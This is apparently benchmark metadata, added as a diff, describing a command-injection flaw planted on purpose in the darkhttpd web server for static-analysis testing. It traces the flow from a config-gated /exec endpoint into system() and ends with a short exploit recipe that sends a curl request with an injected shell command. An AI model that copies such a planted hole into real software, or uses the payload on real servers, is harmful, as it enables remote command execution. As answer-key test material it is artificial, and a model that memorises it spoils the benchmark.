@@ -1,0 +1,65 @@
+PACKAGE:     darkhttpd
+COMMIT:      cc8e27b7a5c8296aec19ab7da02cda6b31ef3d26
+SOURCE:      /home/ubuntu/anthropic/corpus/darkhttpd/
+AXES:        C2 I1 S1
+
+DESCRIPTION:
+  Config-file-gated command injection. The server must be started with
+  --config pointing to a file containing exec_mode = 1 and exec_logging = 1
+  for the vulnerable /exec endpoint to be reachable. A user-supplied URL
+  query parameter flows directly into system() with no sanitization.
+
+CONFIG_GATE (C2 — config file):
+  mechanism:  key=value config file parsed by read_exec_config(); exec_cfg
+              populated via fopen/fgets/sscanf; two fields (enabled + logging)
+              must both be 1
+  check:      exec_cfg.enabled && exec_cfg.logging two lines above dispatch
+              `if (exec_cfg.enabled && exec_cfg.logging && strncmp(conn->url, "/exec", 5) == 0 ...)`
+  complexity: config file I/O → struct population → two-field guard; 3+ function
+              hops from fopen to system()
+
+  CONFIG FILE:
+    --config /path/to/file   (required CLI arg to load settings)
+    File format:
+      exec_mode = 1
+      exec_logging = 1
+
+INPUT_FLOW (I1 — direct):
+  entry:      HTTP GET /exec?cmd=<payload>  →  conn->url (set by parse_request())
+  path:       process_request() dispatches to handle_exec()
+              handle_exec() extracts the substring after "cmd=" via strchr()
+              the raw string is passed directly to system()
+  transforms: none — no urldecode(), no snprintf(), no copy
+
+SANITIZATION (S1 — none):
+  none
+
+SINK:        system() in handle_exec() (darkhttpd.c, injected after generate_dir_listing)
+
+CHANGED FILES:
+  darkhttpd.c — 5 hunks:
+    1. global:              added struct exec_config and exec_cfg instance
+    2. usage():             added --config entry
+    3. read_exec_config():  new function parsing key=value file via fopen/fgets/sscanf
+    4. parse_commandline(): added --config branch calling read_exec_config()
+    5. handle_exec():       new function with direct system() call
+    6. process_request():   added exec route guarded by exec_cfg.enabled && exec_cfg.logging
+
+EXPLOIT:
+  build:   gcc -o darkhttpd darkhttpd.c
+  config:  echo 'exec_mode = 1' > /tmp/e.conf && echo 'exec_logging = 1' >> /tmp/e.conf
+  start:   ./darkhttpd /tmp/www --port 18117 --config /tmp/e.conf
+  trigger: curl 'http://127.0.0.1:18117/exec?cmd=id>/tmp/poc_117_marker'
+  verify:  cat /tmp/poc_117_marker
+  expect:  uid=... line written by the server process
+
+  gate bypass: omitting --config (or using a config without exec_mode=1 and
+               exec_logging=1) causes /exec to return 404.
+
+NOTES:
+  - system() output goes to the server's stdout/stderr (inherited fds), not the
+    HTTP response body. Use a write-to-file payload (id>/tmp/marker) to confirm.
+  - The gate is NEVER set from argv directly; exec_mode/exec_logging can only
+    be set via the config file parsed by read_exec_config().
+  - Joern must model fopen → fgets → sscanf → exec_cfg.enabled/logging → guard
+    to determine that the exec endpoint is reachable.
